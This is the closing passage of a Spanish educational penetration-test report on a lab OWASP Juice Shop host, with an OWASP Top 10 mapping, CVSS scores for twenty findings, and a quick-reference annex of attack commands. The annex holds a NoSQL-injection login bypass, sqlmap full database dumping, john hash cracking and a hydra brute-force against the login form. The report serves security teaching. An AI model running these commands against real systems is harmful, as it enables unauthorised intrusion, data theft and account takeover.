| P4 | JS-V021 (si existe) | < 3 meses | Operaciones |

### 8.3 Cumplimiento de OWASP Top 10 2021

| OWASP Category | Vulnerabilidades Encontradas | Cumplimiento |
|----------------|---------------------------|--------------|
| A01:2021 Broken Access Control | JS-V002, JS-V005, JS-V015, JS-V016, JS-V018 | 5/5 |
| A02:2021 Cryptographic Failures | JS-V003, JS-V013 | 2/5 |
| A03:2021 Injection | JS-V001, JS-V004, JS-V006, JS-V014 | 4/5 |
| A04:2021 Insecure Design | JS-V010, JS-V017 | 2/5 |
| A05:2021 Security Misconfiguration | JS-V008, JS-V014 | 2/5 |
| A06:2021 Vulnerable Components | - | 0/5 |
| A07:2021 Auth Failures | JS-V007, JS-V011, JS-V012, JS-V019 | 4/5 |
| A08:2021 Software Integrity | JS-V010 | 1/5 |
| A09:2021 Logging Failures | JS-V020 | 1/5 |
| A10:2021 SSRF | JS-V009 | 1/5 |

---

## 9. ANEXOS

### Anexo A: Comandos de Referencia Rapida

```bash
# ===================
# RECONOCIMIENTO
# ===================

# Ping sweep
nmap -sn 192.168.56.0/24

# Escaneo de puertos
nmap -p- 192.168.56.101

# Analisis de servicios
nmap -sV -sC 192.168.56.101 -p 3000

# ===================
# ENUMERACION
# ===================

# Enumerar directorios
gobuster dir -u http://192.168.56.101:3000 -w /usr/share/wordlists/dirb/common.txt

# Verificar headers
curl -I http://192.168.56.101:3000

# ===================
# EXPLOTACION
# ===================

# NoSQL Injection
curl -X POST http://192.168.56.101:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$ne":""},"password":{"$ne":""}}'

# SQLMap basico
sqlmap -u "http://192.168.56.101:3000/rest/products/search?q=test" --batch

# SQLMap extraccion completa
sqlmap -u "..." --dump-all --batch

# ===================
# POST-EXPLOTACION
# ===================

# Crackear hashes
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Ver resultados
john --show hashes.txt

# ===================
# HERRAMIENTAS KALI
# ===================

# Burp Suite
burpsuite &

# Nikto
nikto -h http://192.168.56.101:3000

# Hydra (fuerza bruta)
hydra -l admin@juice-sh.op -P rockyou.txt 192.168.56.101 http-post-form "/rest/user/login:email=^USER^&password=^PASS^:Invalid"
```

### Anexo B: Puntuaciones CVSS Completas

| ID | Titulo | CVSS v3.1 | Vector |
|----|--------|-----------|--------|
| JS-V001 | Inyeccion NoSQL | 9.1 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| JS-V002 | Broken Access Control | 9.3 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| JS-V003 | Password Hashing Debil | 8.2 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N |
| JS-V004 | Inyeccion SQL | 9.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| JS-V005 | Path Traversal | 7.5 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| JS-V006 | XSS Almacenado | 8.1 | AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N |
| JS-V007 | Falta Rate Limiting | 7.5 | AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N |
| JS-V008 | Headers Faltantes | 5.3 | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N |
| JS-V009 | SSRF | 8.6 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N |
| JS-V010 | Price Manipulation | 9.1 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| JS-V011 | JWT Alg None | 9.1 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| JS-V012 | User Enumeration | 4.3 | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N |
| JS-V013 | CC Sin Cifrar | 9.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| JS-V014 | XXE | 9.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| JS-V015 | Mass Assignment | 7.5 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N |
| JS-V016 | CSRF | 6.1 | AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N |
| JS-V017 | Re DOS | 6.5 | AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |
| JS-V018 | Config Expuesta | 8.2 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N |
| JS-V019 | Session Fixation | 6.1 | AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N |
| JS-V020 | Falta Logging | 5.5 | AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N |

---

**FIN DEL INFORME**

*Documento generado con fines educativos para entornos controlados de pentesting.*

*Fecha de elaboracion: 24 de Marzo de 2026*
